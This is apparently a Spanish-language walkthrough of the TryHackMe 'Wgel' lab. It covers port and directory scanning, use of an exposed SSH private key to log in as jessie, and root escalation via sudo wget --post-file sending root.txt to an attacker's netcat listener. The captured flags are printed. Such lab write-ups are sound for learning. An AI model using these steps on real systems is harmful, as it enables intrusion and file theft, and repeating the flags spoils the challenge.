@@ -1,0 +1,52 @@
+Wgel
+Tryhackme
+
+nmap
+nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn -T3 10.10.42.94 -oN wgel
+• 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.2p2
+• 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 en el servidor Ubuntu. "<!-- Jessie, no olvides actualizar el sitio web -->" Jessie podría ser un posible usuario.
+
+gobuster
+gobuster dir -u http://10.10.42.94 -w /usr/share/wordlists/wfuzz/general/common.txt
+• /sitemap
+
+gobuster dir -u http://10.10.42.94/sitemap -w /usr/share/wordlists/wfuzz/general/big.txt
+• /css
+• /fonts
+• /images
+• /js
+
+wfuzz --hc 404 -c -u http://10.10.42.94/sitemap/FUZZ -w /usr/share/wordlists/dirb/common.txt
+•/.ssh
+•/.htpasswd
+•/.htaccess
+•/.hta
+•/css
+•/fonts
+
+Dentro de "/.ssh" encontramos "id_rsa", lo que implica que no necesitamos una contraseña para acceder al puerto SSH.
+
+chmod 600 id_rsa
+***Averiguar lo que hace este comando***
+
+ssh -i id_rsa jessie@10.10.42.94
+Ahora somos el usuario "jessie" en el puerto SSH.
+
+Dentro del directorio encontramos la flag del usuario:
+057c67131c3d5e42dd5cd3075b198ff6
+
+Ahora, debemos escalar privilegios hasta llegar a root.
+
+Al usar "sudo -l", encontramos que el comando "wget" no requiere privilegios, así que intentaremos robar el "root.txt" con netcat. Buscamos información sobre la escalada de privilegios con "wget" en Google y encontramos lo siguiente:
+
+sudo /usr/bin/wget --post-file=(nombre-archivo) (IP-atacante)
+
+Fuente: https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/
+
+Desde netcat, nos ponemos a la escucha:
+
+nc -nlvp 80
+(el puerto 80 se usa por defecto)
+
+Respuesta:
+b1b968b37519ad1daa6408188649263d
